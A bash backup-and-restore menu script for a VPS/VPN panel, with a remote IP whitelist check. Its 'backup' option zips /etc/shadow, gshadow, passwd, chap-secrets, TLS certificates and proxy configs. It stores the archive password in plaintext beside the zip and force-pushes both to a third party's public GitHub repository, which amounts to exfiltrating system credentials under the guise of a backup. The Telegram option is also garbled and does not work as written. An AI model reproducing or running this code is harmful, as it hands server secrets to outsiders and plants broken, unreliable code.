#!/bin/bash
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
###########- COLOR CODE -##############
colornow=$(cat /etc/tarap/theme/color.conf)
export NC="\e[0m"
export YELLOW='\033[0;33m';
export RED="\033[0;31m"
export COLOR1="$(cat /etc/tarap/theme/$colornow | grep -w "TEXT" | cut -d: -f2|sed 's/ //g')"
export COLBG1="$(cat /etc/tarap/theme/$colornow | grep -w "BG" | cut -d: -f2|sed 's/ //g')"
WH='\033[1;37m'
###########- END COLOR CODE -##########

BURIQ () {
    curl -sS https://raw.githubusercontent.com/kuhing/ip/main/vps > /root/tmp
    data=( `cat /root/tmp | grep -E "^### " | awk '{print $2}'` )
    for user in "${data[@]}"
    do
    exp=( `grep -E "^### $user" "/root/tmp" | awk '{print $3}'` )
    d1=(`date -d "$exp" +%s`)
    d2=(`date -d "$biji" +%s`)
    exp2=$(( (d1 - d2) / 86400 ))
    if [[ "$exp2" -le "0" ]]; then
    echo $user > /etc/.$user.ini
    else
    rm -f /etc/.$user.ini > /dev/null 2>&1
    fi
    done
    rm -f /root/tmp
}

MYIP=$(curl -sS ipv4.icanhazip.com)
Name=$(curl -sS https://raw.githubusercontent.com/kuhing/ip/main/vps | grep $MYIP | awk '{print $2}')
echo $Name > /usr/local/etc/.$Name.ini
CekOne=$(cat /usr/local/etc/.$Name.ini)

Bloman () {
if [ -f "/etc/.$Name.ini" ]; then
CekTwo=$(cat /etc/.$Name.ini)
    if [ "$CekOne" = "$CekTwo" ]; then
        res="Expired"
    fi
else
res="Permission Accepted..."
fi
}

PERMISSION () {
    MYIP=$(curl -sS ipv4.icanhazip.com)
    IZIN=$(curl -sS https://raw.githubusercontent.com/kuhing/ip/main/vps | awk '{print $4}' | grep $MYIP)
    if [ "$MYIP" = "$IZIN" ]; then
    Bloman
    else
    res="Permission Denied!"
    fi
    BURIQ
}
red='\e[1;31m'
green='\e[1;32m'
yellow='\033[0;33m'
NC='\e[0m'
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[31;1m${*}\\033[0m"; }
PERMISSION
if [ -f /home/needupdate ]; then
red "Your script need to update first !"
exit 0
elif [ "$res" = "Permission Accepted..." ]; then
echo -ne
else
red "Permission Denied!"
exit 0
fi
clear
function bckpbot(){
clear
IP=$(curl -sS ipv4.icanhazip.com);
date=$(date +"%Y-%m-%d")
domain=$(cat /etc/xray/domain)
clear
echo -e "[ ${green}INFO${NC} ] Create for database"
read -rp "Enter Token (Creat on Botfather) : " -e token
read -rp "Enter Chat id, Channel, Group Or Your Id  : " -e id
TIMES="10"
CHATID=$id
KEY=$token
URL="https://api.telegram.org/bot$KEY/sendMessage"sleep 1
clear
echo -e "[ ${green}INFO${NC} ] Processing... "
mkdir -p /root/backup
sleep 1

cp -r /root/.acme.sh /root/backup/ &> /dev/null
cp -r /etc/passwd /root/backup/ &> /dev/null
cp -r /etc/group /root/backup/ &> /dev/null
cp -r /etc/shadow /root/backup/ &> /dev/null
cp -r /etc/gshadow /root/backup/ &> /dev/null
cp -r /etc/ppp/chap-secrets /root/backup/chap-secrets &> /dev/null
cp -r /var/lib/ /root/backup &> /dev/null
cp -r /etc/xray /root/backup/xray &> /dev/null
cp -r /root/nsdomain backup/nsdomain &> /dev/null
cp -r /etc/slowdns backup/slowdns &> /dev/null
cp -r /etc/nginx/conf.d /root/backup/conf.d/ &> /dev/null
cp -r /home/vps/public_html /root/backup/public_html &> /dev/null
cp -r /etc/cron.d /root/backup/cron.d &> /dev/null
cp -r /etc/crontab /root/backup/crontab &> /dev/null
cd /root
zip -r $IP.zip backup > /dev/null 2>&1
TEXT="
<code>$IP<code>
<code>Your Domain : $domain<code>
<code>Date       : $date<code>
<code>Your IP VPS  : $IP" http://telegram.me/@kuhing_bot/sendDocument &> /dev/null<code>
"
curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null

rm -fr /root/backup &> /dev/null
rm -fr /root/user-backup &> /dev/null
rm -f /root/$NameUser.zip &> /dev/null
rm -f /root/$IP.zip &> /dev/null

echo " Please Check Your Channel"
echo -e ""

read -n 1 -s -r -p "Press any key to back on menu"
menu
}
function autobckpbot(){
clear
cat > /etc/cron.d/bckp_otm <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 5 * * * root /usr/bin/bckp
END
service cron restart >/dev/null 2>&1
service cron reload >/dev/null 2>&1

echo -e "${BIGreen}Auto Backup Start  Daily 05.00 AM${NC} "
echo -e ""
read -n 1 -s -r -p "Press any key to back on menu"
menu
}
function backup(){
clear
IP=$(curl -sS ipv4.icanhazip.com);
date=$(date +"%Y-%m-%d")

clear
echo -e "[ ${green}INFO${NC} ] Create password for database"
#read -rp "Enter Token (Contact Tarap-Kuhing) : " -e token
read -rp "Enter Name File Your Backup  : " -e NameUser
read -rp "Enter password : " -e InputPass
sleep 1
if [[ -z $InputPass ]]; then
exit 0
fi
echo -e "[ ${green}INFO${NC} ] Processing... "
mkdir -p /root/backup
sleep 1

cp -r /root/.acme.sh /root/backup/ &> /dev/null
cp -r /etc/passwd /root/backup/ &> /dev/null
cp -r /etc/group /root/backup/ &> /dev/null
cp -r /etc/shadow /root/backup/ &> /dev/null
cp -r /etc/gshadow /root/backup/ &> /dev/null
cp -r /etc/ppp/chap-secrets /root/backup/chap-secrets &> /dev/null
cp -r /var/lib/ /root/backup &> /dev/null
cp -r /etc/xray /root/backup/xray &> /dev/null
cp -r /root/nsdomain backup/nsdomain &> /dev/null
cp -r /etc/slowdns backup/slowdns &> /dev/null
cp -r /etc/nginx/conf.d /root/backup/conf.d/ &> /dev/null
cp -r /home/vps/public_html /root/backup/public_html &> /dev/null
cp -r /etc/cron.d /root/backup/cron.d &> /dev/null
cp -r /etc/crontab /root/backup/crontab &> /dev/null
cd /root
zip -rP $InputPass $NameUser.zip backup > /dev/null 2>&1

##############++++++++++++++++++++++++#############
LLatest=`date`
Get_Data () {
git clone https://github.com/jambanbkn/userbackup.git /root/user-backup/ &> /dev/null
}

Mkdir_Data () {
mkdir -p /root/user-backup/$NameUser
}

Input_Data_Append () {
if [ ! -f "/root/user-backup/$NameUser/$NameUser-last-backup" ]; then
touch /root/user-backup/$NameUser/$NameUser-last-backup
fi
echo -e "User        : $NameUser
Password    : $InputPass
last-backup : $LLatest
" >> /root/user-backup/$NameUser/$NameUser-last-backup
mv /root/$NameUser.zip /root/user-backup/$NameUser/
}

Save_And_Exit () {
    cd /root/user-backup
    git config --global user.email "jambanbkn@gmail.com" &> /dev/null
    git config --global user.name "jambanbkn" &> /dev/null
    rm -rf .git &> /dev/null
    git init &> /dev/null
    git add . &> /dev/null
    git commit -m $NameUser &> /dev/null
    git branch -M main &> /dev/null
    git remote add origin https://github.com/jambanbkn/userbackup.git
    git push -f https://github.com/jambanbkn/userbackup.git &> /dev/null
}

if [ ! -d "/root/user-backup/" ]; then
sleep 1
echo -e "[ ${green}INFO${NC} ] Getting database... "
Get_Data
Mkdir_Data
sleep 1
echo -e "[ ${green}INFO${NC} ] Getting info server... "
Input_Data_Append
sleep 1
echo -e "[ ${green}INFO${NC} ] Processing updating server...... "
echo -e ""
echo -e "$yellow COPY Username GITHUB DI BAWAH INI$NC"
echo -e""
echo -e "$yellow Username :👉  jambanbkn  👈$NC"
echo -e""
echo -e "$yellow PASTEKAN Username GITHUB DI BAWAH INI$NC"
echo -e ""
Save_And_Exit
fi
link="https://raw.githubusercontent.com/jambanbkn/userbackup/main/$NameUser/$NameUser.zip"
sleep 1
echo -e "[ ${red}INFO${NC} ] Backup done "
sleep 1
echo
sleep 1
echo -e "[ ${red}INFO${NC} ] Generete Link Backup "
echo
sleep 2
echo -e "The following is a link to your vps data backup file.

"${yellow}Your VPS Backup Name    :👉👉👉  $NameUser  👈👈👈${NC}"
"${red}save the NameUser pliss!!!${NC}"

"${yellow}Your VPS Backup Password:👉👉👉  $InputPass  👈👈👈${NC}"
"${red}save the Password pliss!!!${NC}"

"${yellow}Your VPS Backup Link    :👉👉👉  $link  👈👈👈${NC}"

"${red}save the link pliss!!!!${NC}"

If you want to restore data, please enter the link above.
Thank You For Using Our Services"

rm -fr /root/backup &> /dev/null
rm -fr /root/user-backup &> /dev/null
rm -f /root/$NameUser.zip &> /dev/null
cd
echo
read -n 1 -s -r -p "Press any key to back on menu"
menu
}
function restore(){
cd
read -rp "Enter Name File Your Backup  : " -e NameUser

cekdata=$(curl -sS https://raw.githubusercontent.com/jambanbkn/userbackup/main/$NameUser/$NameUser.zip | grep 404 | awk '{print $1}' | cut -d: -f1)

[[ "$cekdata" = "404" ]] && {
red "Data not found / you never backup"
exit 0
} || {
echo -e "$yellow files available for restore $NameUser ${NC}"
}

echo -e "[ ${GREEN}INFO${NC} ] • Restore Data..."
read -rp "Password File: " -e InputPass
echo -e "[ ${GREEN}INFO${NC} ] • Downloading data.."
mkdir -p /root/backup
wget -q -O /root/backup/backup.zip "https://raw.githubusercontent.com/jambanbkn/userbackup/main/$NameUser/$NameUser.zip" &> /dev/null
echo -e "[ ${GREEN}INFO${NC} ] • Getting your data..."
unzip -P $InputPass /root/backup/backup.zip &> /dev/null
echo -e "[ ${GREEN}INFO${NC} ] • Starting to restore data..."
rm -f /root/backup/backup.zip &> /dev/null
sleep 1
cd /root/backup
echo -e "[ ${GREEN}INFO${NC} ] • Restoring passwd data..."
sleep 1
cp -r /root/backup/passwd /etc/ &> /dev/null
echo -e "[ ${GREEN}INFO${NC} ] • Restoring group data..."
sleep 1
cp -r /root/backup/group /etc/ &> /dev/null
echo -e "[ ${GREEN}INFO${NC} ] • Restoring shadow data..."
sleep 1
cp -r /root/backup/shadow /etc/ &> /dev/null
echo -e "[ ${GREEN}INFO${NC} ] • Restoring gshadow data..."
sleep 1
cp -r /root/backup/gshadow /etc/ &> /dev/null
echo -e "[ ${GREEN}INFO${NC} ] • Restoring chap-secrets data..."
sleep 1
cp -r /root/backup/chap-secrets /etc/ppp/ &> /dev/null
echo -e "[ ${GREEN}INFO${NC} ] • Restoring passwd1 data..."
sleep 1
#cp -r /root/backup/passwd1 /etc/ipsec.d/passwd &> /dev/null
#echo -e "[ ${GREEN}INFO${NC} ] • Restoring ss.conf data..."
#sleep 1
#cp -r /root/backup/ss.conf /etc/shadowsocks-libev/ss.conf &> /dev/null
#echo -e "[ ${GREEN}INFO${NC} ] • Restoring admin data..."
#sleep 1
cp -r /root/backup /var/lib/ &> /dev/null
#cp -r /root/backup/wireguard /etc/ &> /dev/null
cp -r /root/backup/.acme.sh /root/ &> /dev/null
cp -r /root/backup/xray /etc/ &> /dev/null
cp -r /root/backup/slowdns /etc/ &> /dev/null
cp -r /root/backup/nsdomain/root/ &> /dev/null
cp -r /root/backup/conf.d /etc/nginx/ &> /dev/null
#cp -r /root/backup/shadowsocksr /usr/local/ &> /dev/null
cp -r /root/backup/public_html /home/vps/ &> /dev/null
cp -r /root/backup/crontab /etc/ &> /dev/null
cp -r /root/backup/cron.d /etc/ &> /dev/null
systemctl restart xray
rm -fr /root/backup &> /dev/null
echo -e "[ ${GREEN}INFO${NC} ] • Done..."
sleep 1
rm -f /root/backup/backup.zip &> /dev/null
cd
echo
read -n 1 -s -r -p "Press any key to certv2ry"
certv2ray
}
clear
echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}"
echo -e "$COLOR1 ${NC} ${COLBG1}             ${WH}• BACKUP PANEL MENU •             ${NC} $COLOR1 $NC"
echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}"
echo -e " $COLOR1┌───────────────────────────────────────────────┐${NC}"
echo -e " $COLOR1 $NC   ${WH}[${COLOR1}01${WH}]${NC} ${COLOR1}• ${WH}BACKUP VPS github  $COLOR1 $NC"
echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
echo -e " $COLOR1 $NC   ${WH}[${COLOR1}02${WH}]${NC} ${COLOR1}• ${WH}RESTORE VPS github  $COLOR1 $NC"
echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
echo -e " $COLOR1 $NC   ${WH}[${COLOR1}03${WH}]${NC} ${COLOR1}• ${WH}BACKUP2 VPS  $COLOR1 $NC"
echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
echo -e " $COLOR1 $NC   ${WH}[${COLOR1}04${WH}]${NC} ${COLOR1}• ${WH}AUTOBACKUP2 VPS  $COLOR1 $NC"
echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
echo -e " $COLOR1 $NC   ${WH}[${COLOR1}05${WH}]${NC} ${COLOR1}• ${WH}RESTORE2 VPS  $COLOR1 $NC"
echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
echo -e " $COLOR1 $NC   ${WH}[${COLOR1}06${WH}]${NC} ${COLOR1}• ${WH}BACKUP-BOT/TELE VPS  $COLOR1 $NC"
echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
echo -e " $COLOR1 $NC   ${WH}[${COLOR1}07${WH}]${NC} ${COLOR1}• ${WH}AUTOBACKUP-BOT/TELE VPS  $COLOR1 $NC"
echo -e " $COLOR1 $NC                                               $COLOR1 $NC"
echo -e " $COLOR1 $NC   ${WH}[${COLOR1}00${WH}]${NC} ${COLOR1}• ${WH}GO BACK${NC}                              $COLOR1 $NC"
echo -e " $COLOR1└───────────────────────────────────────────────┘${NC}"
echo -e "$COLOR1┌────────────────────── ${WH}BY${NC} ${COLOR1}───────────────────────┐${NC}"
echo -e "$COLOR1 ${NC}                ${WH}• TARAP KUHING •${NC}                 $COLOR1 $NC"
echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}"
echo -e ""
echo -ne " ${WH}Select menu ${COLOR1}: ${WH}"; read opt
echo -e ""
case $opt in
01 | 1) clear ; backup ;;
02 | 2) clear ; restore ;;
03 | 3) clear ; backup2 ;;
04 | 4) clear ; autobackup ;;
05 | 5) clear ; restore2 ;;
06 | 6) clear ; bckpbot ;;
07 | 7) clear ; autobckpbot ;;
00 | 0) clear ; menu ;;
*) clear ; menu-backup ;;
x) exit ;;
*) echo -e "" ; echo "Press any key to back on menu" ; sleep 1 ; menu ;;
esac
